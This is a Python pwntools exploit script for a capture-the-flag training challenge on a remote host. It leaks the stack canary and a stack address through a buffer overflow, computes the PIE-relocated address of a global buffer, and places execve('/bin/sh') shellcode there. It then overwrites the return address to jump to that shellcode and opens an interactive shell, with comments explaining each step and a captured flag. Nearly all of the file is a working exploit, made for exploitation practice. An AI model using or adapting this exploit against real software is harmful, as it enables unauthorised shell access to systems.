from pwn import *
import time

r = remote("bin.training.jinblack.it", 2012)
#r = remote("127.0.0.1", 4000)

# r = process("./aslr")
# gdb.attach(r, '''
# b * (main + 336)
# ''')


#flag{you_can_also_leak_the_binary_And_compute_bss!}

#USEFUL TOOLS:
# info address, to print an address (I use it to print the address of ps1 in local and to calculate the offset that will remain the same in remote too)
# disassemble, to know where we are in the functions in order to debug easily, since there is PIE active

#since I have, as in the challenge leakers, both a global variable and a local variable, the goal is to write the shellcode in the global one and then jump
#inside it, with the difference that I have to retrieve at runtime the address of the global variable because PIE is active


#input("press a key to send the shellcode...")

#putting the shellcode in the global variable
shellcode = b"\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"

#first send: shellcode + little nop sled, to avoid the rewrite of a character with a 0 that would block the printf of the canary then (as in leakers)
nop_sled = b"\x90" * 8
payload1 = shellcode + nop_sled
r.sendline(payload1)


#to avoid the mixing of the reads
time.sleep(0.5)


#input("press a key to leak the canary...")

#second send: getting the canary, fulling the buffer with characters until I reach the canary, that will be
#the next 8 bytes of the stack
payload2 = b"a" * 104 #buffer is 104-bytes long
r.sendline(payload2)
r.recvuntil(payload2)

canary = u64(r.recv(8)) - 0xa
print(hex(canary))
#CANARY FOUND: the canary change at every execution

######### 
#Test the canary sending 104 byte + canary
#payload2 = payload1 + p64(canary)
#r.sendline(payload2)
#just to test
# It works because program stopped with exit code 0
#############


#now I have to retrieve the address of the global variable. I saw it in local using "info address ps1", but now I want it at runtime.
#Using "x /100x" on the stack, I see that there is an address similar to the one of ps1 in local, I choose it
#it is immediately after the canary

stack_address = u64(r.recv(8) + b"\x00\x00")
#print(hex(stack_address))
offset = 2098624
global_variable_address = stack_address + 2098624
print(hex(global_variable_address))


# To find where to write the address:
#r.sendline(payload2 + cyclic(300))
# in ret there is: 61616163


#loading the nop sled and the shellcode to execute in the buffer: now I know its address, so I know where to jump!
nop_sled = (104 - len(shellcode)) * b"\x90"
payload4 = nop_sled + shellcode + p64(canary)

# Send 104 bytes + canary + put in ret the address 
# of stack buffer (where the shellcode is)
payload5 = payload4 + cyclic(cyclic_find(0x61616163))
#I don't jump to the start of the buffer address but after to avoid a problem with a byte that is not a nop instruction
payload5 += p64(global_variable_address)
r.sendline(payload5)

r.interactive()